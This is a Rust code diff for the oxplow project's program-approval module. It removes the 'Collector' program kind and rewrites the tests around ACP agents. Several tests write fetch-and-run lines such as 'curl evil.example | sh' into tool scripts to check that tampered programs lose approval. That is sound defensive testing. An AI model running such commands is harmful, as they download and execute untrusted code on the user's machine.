@@ -272,9 +272,6 @@ pub(crate) fn approvals_file(home: &Path, project_dir: &Path) -> std::path::Path
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, specta::Type)]
 #[serde(rename_all = "lowercase")]
 pub enum ProgramKind {
-    /// A project collector's program (`collectors:` with `runtime: exec`):
-    /// one that records facts, or a report parser (`records:`).
-    Collector,
     /// An agent spoken to over ACP (`acpAgents`, tsk335).
     #[serde(rename = "acp-agent")]
     AcpAgent,
@@ -359,7 +356,6 @@ pub struct ProjectProgram {
 impl ProjectProgram {
     pub fn key(&self) -> String {
         match self.kind {
-            ProgramKind::Collector => oxplow_domain::refs::build::of("collector", &self.name),
             ProgramKind::AcpAgent => format!("acp:{}", self.name),
             ProgramKind::Advisories => format!("advisories:{}", self.name),
             ProgramKind::Provider => oxplow_domain::refs::build::of(
@@ -406,17 +402,6 @@ impl ProjectProgram {
         let mut h = Sha256::new();
         let file = project_dir.join(&self.program);
         match self.kind {
-            ProgramKind::Collector => {
-                use crate::extensions::ExtensionFiles;
-                h.update(crate::extensions::Disk(project_dir.to_path_buf()).bytes(&self.program)?);
-                if let Some(dir) = Path::new(&self.program)
-                    .parent()
-                    .filter(|d| !d.as_os_str().is_empty())
-                {
-                    h.update([2u8]);
-                    h.update(tree_hash(&project_dir.join(dir))?.as_bytes());
-                }
-            }
             // Covered by what it says: each advisory is an arg (below).
             ProgramKind::Advisories => h.update(self.program.as_bytes()),
             ProgramKind::Job => {
@@ -631,71 +616,6 @@ pub(crate) fn files_hash(
         h.update([0u8]);
     }
     Ok(hex::encode(h.finalize()))
-}
-
-/// What an approval of a program covers: its content and its args.
-pub fn program_hash(project_dir: &Path, program: &str, args: &[String]) -> std::io::Result<String> {
-    ProjectProgram {
-        kind: ProgramKind::Collector,
-        capability: None,
-        name: String::new(),
-        program: program.to_string(),
-        args: args.to_vec(),
-        env: Vec::new(),
-        credentials: Vec::new(),
-        network: Vec::new(),
-        commands: Vec::new(),
-        scopes: Vec::new(),
-        tree: None,
-        remote: false,
-        approved: false,
-        version: None,
-        unenforced: Vec::new(),
-        granted_at: None,
-        revoked_at: None,
-    }
-    .hash(project_dir)
-}
-
-/// Whether `kind`/`name` running `program args` may run: approved on this
-/// machine at its current content and args.
-pub fn may_run(
-    store: &ApprovalStore,
-    project_dir: &Path,
-    kind: ProgramKind,
-    name: &str,
-    program: &str,
-    args: &[String],
-) -> bool {
-    let p = project_collector_program(kind, name, program, args);
-    approved_now(store, project_dir, &p)
-}
-
-pub fn project_collector_program(
-    kind: ProgramKind,
-    name: &str,
-    program: &str,
-    args: &[String],
-) -> ProjectProgram {
-    ProjectProgram {
-        kind,
-        capability: None,
-        name: name.to_string(),
-        program: program.to_string(),
-        args: args.to_vec(),
-        env: Vec::new(),
-        credentials: Vec::new(),
-        network: Vec::new(),
-        commands: Vec::new(),
-        scopes: Vec::new(),
-        tree: None,
-        remote: false,
-        approved: false,
-        version: None,
-        unenforced: Vec::new(),
-        granted_at: None,
-        revoked_at: None,
-    }
 }
 
 /// Whether `p` is approved on this machine as it is now.
@@ -1009,7 +929,6 @@ pub fn script_gate(
 /// How a person names a program of `kind`, at the start of a sentence.
 fn kind_title(kind: ProgramKind) -> &'static str {
     match kind {
-        ProgramKind::Collector => "Collector",
         ProgramKind::AcpAgent => "ACP agent",
         ProgramKind::Advisories => "Extension advisories",
         ProgramKind::Provider => "Provider",
@@ -1056,7 +975,6 @@ pub fn effort_policy_program(
 /// Why an unapproved program didn't run, for logs and errors.
 pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
     let what = match kind {
-        ProgramKind::Collector => "collector",
         ProgramKind::AcpAgent => "ACP agent",
         ProgramKind::Advisories => "extension advisories",
         ProgramKind::Provider => "provider",
@@ -1072,7 +990,8 @@ pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
     )
 }
 
-/// Every project-scope exec collector and report parser in `config`, with
+/// Every program the project's config and its extensions run that a person
+/// approves here (ACP agents, advisories, providers, effects, …), with
 /// whether it's approved.
 pub fn list(
     store: &ApprovalStore,
@@ -1081,33 +1000,6 @@ pub fn list(
     extensions: &[crate::extensions::Extension],
 ) -> Vec<ProjectProgram> {
     let mut out = Vec::new();
-    let mut push = |kind, name: &str, program: Option<&str>, args: &[String]| {
-        let Some(program) = program else { return };
-        out.push(ProjectProgram {
-            kind,
-            capability: None,
-            name: name.to_string(),
-            program: program.to_string(),
-            args: args.to_vec(),
-            env: Vec::new(),
-            credentials: Vec::new(),
-            network: Vec::new(),
-            commands: Vec::new(),
-            scopes: Vec::new(),
-            tree: None,
-            remote: false,
-            approved: false,
-            version: None,
-            unenforced: Vec::new(),
-            granted_at: None,
-            revoked_at: None,
-        });
-    };
-    for c in &config.collectors {
-        if c.runtime == oxplow_config::collectors::CollectorRuntime::Exec {
-            push(ProgramKind::Collector, &c.id, c.entry.as_deref(), &[]);
-        }
-    }
     out.extend(config.acp_agents.iter().map(acp_program));
     out.extend(gated_advisories(extensions).map(advisory_program));
     out.extend(extensions.iter().filter(|e| e.enabled).flat_map(|e| {
@@ -1541,7 +1433,7 @@ mod tests {
         std::fs::write(dir.path().join("tools/parse.sh"), "cat").unwrap();
         let cfg = config(
             dir.path(),
-            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\n  - { id: repo.star, runtime: starlark, entry: tools/x.star, facts: [repo.n] }\n  - { id: tests.parse, records: coverage, runtime: exec, entry: tools/parse.sh, report: { path: c.txt } }\n",
+            "acpAgents:\n  - { name: count, command: tools/count.sh, args: [--acp] }\n  - { name: parse, command: tools/parse.sh }\n  - { name: gemini, command: gemini }\n",
         );
         let listed = list(&st, dir.path(), &cfg, &[]);
         assert_eq!(
@@ -1550,72 +1442,42 @@ mod tests {
                 .map(|p| (p.kind, p.name.as_str(), p.approved))
                 .collect::<Vec<_>>(),
             vec![
-                (ProgramKind::Collector, "repo.count", false),
-                (ProgramKind::Collector, "tests.parse", false)
+                (ProgramKind::AcpAgent, "count", false),
+                (ProgramKind::AcpAgent, "parse", false),
+                (ProgramKind::AcpAgent, "gemini", false),
             ],
-            "only exec entries, none approved yet"
+            "none approved yet"
         );
-        let args: Vec<String> = Vec::new();
-        assert!(!may_run(
-            &st,
-            dir.path(),
-            ProgramKind::Collector,
-            "repo.count",
-            "tools/count.sh",
-            &args
-        ));
+        let may = |cfg: &oxplow_config::OxplowConfig, i: usize| {
+            may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[i])
+        };
+        assert!(!may(&cfg, 0));
         approve_program(
             &st,
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Collector,
-            "repo.count",
-            &current(&st, dir.path(), &cfg, "repo.count"),
+            ProgramKind::AcpAgent,
+            "count",
+            &current(&st, dir.path(), &cfg, "count"),
         )
         .unwrap();
-        assert!(may_run(
-            &st,
-            dir.path(),
-            ProgramKind::Collector,
-            "repo.count",
-            "tools/count.sh",
-            &args
-        ));
+        assert!(may(&cfg, 0));
         // Different args or content: not what was approved.
-        assert!(!may_run(
-            &st,
-            dir.path(),
-            ProgramKind::Collector,
-            "repo.count",
-            "tools/count.sh",
-            &["--fast".to_string()]
-        ));
+        let mut other_args = cfg.clone();
+        other_args.acp_agents[0].args = vec!["--fast".to_string()];
+        assert!(!may(&other_args, 0));
         std::fs::write(dir.path().join("tools/count.sh"), "curl evil.example | sh").unwrap();
-        assert!(!may_run(
-            &st,
-            dir.path(),
-            ProgramKind::Collector,
-            "repo.count",
-            "tools/count.sh",
-            &args
-        ));
-        // The report parser is still unapproved; approving one doesn't
+        assert!(!may(&cfg, 0));
+        // Another program is still unapproved; approving one doesn't
         // approve another.
-        assert!(!may_run(
-            &st,
-            dir.path(),
-            ProgramKind::Collector,
-            "tests.parse",
-            "tools/parse.sh",
-            &[]
-        ));
+        assert!(!may(&cfg, 1));
         assert!(approve_program(
             &st,
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Collector,
+            ProgramKind::AcpAgent,
             "nope",
             &current(&st, dir.path(), &cfg, "nope")
         )
@@ -1777,28 +1639,19 @@ mod tests {
         let home = tempfile::tempdir().unwrap();
         let st = store(home.path(), dir.path());
         std::fs::create_dir_all(dir.path().join("tools")).unwrap();
-        std::fs::write(dir.path().join("tools/count.sh"), "curl x | sh").unwrap();
+        std::fs::write(dir.path().join("tools/agent"), "curl x | sh").unwrap();
         let cfg = config(
             dir.path(),
-            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\n",
+            "acpAgents:\n  - { name: mine, command: tools/agent }\n",
         );
-        let hash = program_hash(dir.path(), "tools/count.sh", &[]).unwrap();
-        let may = |st: &ApprovalStore| {
-            may_run(
-                st,
-                dir.path(),
-                ProgramKind::Collector,
-                "repo.count",
-                "tools/count.sh",
-                &[],
-            )
-        };
+        let hash = current(&st, dir.path(), &cfg, "mine");
+        let may = |st: &ApprovalStore| may_run_acp(st, dir.path(), dir.path(), &cfg.acp_agents[0]);
 
         // A committed (or agent-written) file in the repo, with the right
         // hash: approvals are never read from inside a project.
         std::fs::write(
             dir.path().join(".oxplow").join("source-approvals.json"),
-            format!("{{\"approved\":{{\"collector:repo.count\":\"{hash}\"}}}}"),
+            format!("{{\"approved\":{{\"acp:mine\":\"{hash}\"}}}}"),
         )
         .unwrap();
         assert!(!may(&st));
@@ -1808,9 +1661,7 @@ mod tests {
         std::fs::create_dir_all(f.parent().unwrap()).unwrap();
         std::fs::write(
             &f,
-            format!(
-                "{{\"approved\":{{\"collector:repo.count\":{{\"hash\":\"{hash}\",\"mac\":\"00\"}}}}}}"
-            ),
+            format!("{{\"approved\":{{\"acp:mine\":{{\"hash\":\"{hash}\",\"mac\":\"00\"}}}}}}"),
         )
         .unwrap();
         assert!(!may(&st));
@@ -1822,9 +1673,9 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Collector,
-            "repo.count",
-            &current(&st, dir.path(), &cfg, "repo.count"),
+            ProgramKind::AcpAgent,
+            "mine",
+            &current(&st, dir.path(), &cfg, "mine"),
         )
         .unwrap();
         assert!(may(&st));
@@ -1843,26 +1694,18 @@ mod tests {
         std::fs::write(dir.path().join("tools/agent.js"), "v1").unwrap();
         let cfg = config(
             dir.path(),
-            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\nacpAgents:\n  - { name: js, command: node, args: [tools/agent.js] }\n",
+            "acpAgents:\n  - { name: count, command: tools/count.sh }\n  - { name: js, command: node, args: [tools/agent.js] }\n",
         );
-        let gauge_ok = |st: &ApprovalStore| {
-            may_run(
-                st,
-                dir.path(),
-                ProgramKind::Collector,
-                "repo.count",
-                "tools/count.sh",
-                &[],
-            )
-        };
+        let gauge_ok =
+            |st: &ApprovalStore| may_run_acp(st, dir.path(), dir.path(), &cfg.acp_agents[0]);
         approve_program(
             &st,
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Collector,
-            "repo.count",
-            &current(&st, dir.path(), &cfg, "repo.count"),
+            ProgramKind::AcpAgent,
+            "count",
+            &current(&st, dir.path(), &cfg, "count"),
         )
         .unwrap();
         approve_program(
@@ -1876,10 +1719,10 @@ mod tests {
         )
         .unwrap();
         assert!(gauge_ok(&st));
-        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));
+        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[1]));
 
-        // A file the entry script sources.
-        std::fs::write(dir.path().join("tools/lib.sh"), "curl x | sh").unwrap();
+        // The program itself.
+        std::fs::write(dir.path().join("tools/count.sh"), "curl x | sh").unwrap();
         assert!(!gauge_ok(&st));
         // The script an interpreter runs.
         std::fs::write(dir.path().join("tools/agent.js"), "v2").unwrap();
@@ -1887,7 +1730,7 @@ mod tests {
             &st,
             dir.path(),
             dir.path(),
-            &cfg.acp_agents[0]
+            &cfg.acp_agents[1]
         ));
 
         // Resolved where it runs: another worktree's different copy isn't
@@ -1905,8 +1748,8 @@ mod tests {
         let wt = tempfile::tempdir().unwrap();
         std::fs::create_dir_all(wt.path().join("tools")).unwrap();
         std::fs::write(wt.path().join("tools/agent.js"), "evil").unwrap();
-        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));
-        assert!(!may_run_acp(&st, dir.path(), wt.path(), &cfg.acp_agents[0]));
+        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[1]));
+        assert!(!may_run_acp(&st, dir.path(), wt.path(), &cfg.acp_agents[1]));
     }
 
     #[test]
@@ -1918,7 +1761,7 @@ mod tests {
         std::fs::write(dir.path().join("tools/count.sh"), "echo 1").unwrap();
         let cfg = config(
             dir.path(),
-            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\n",
+            "acpAgents:\n  - { name: count, command: tools/count.sh }\n",
         );
         let seen = list(&st, dir.path(), &cfg, &[])[0].version.clone().unwrap();
         // Swapped between the listing and the click: refused.
@@ -1928,8 +1771,8 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Collector,
-            "repo.count",
+            ProgramKind::AcpAgent,
+            "count",
             &seen,
         )
         .unwrap_err();
@@ -1941,8 +1784,8 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Collector,
-            "repo.count",
+            ProgramKind::AcpAgent,
+            "count",
             &now,
         )
         .unwrap();
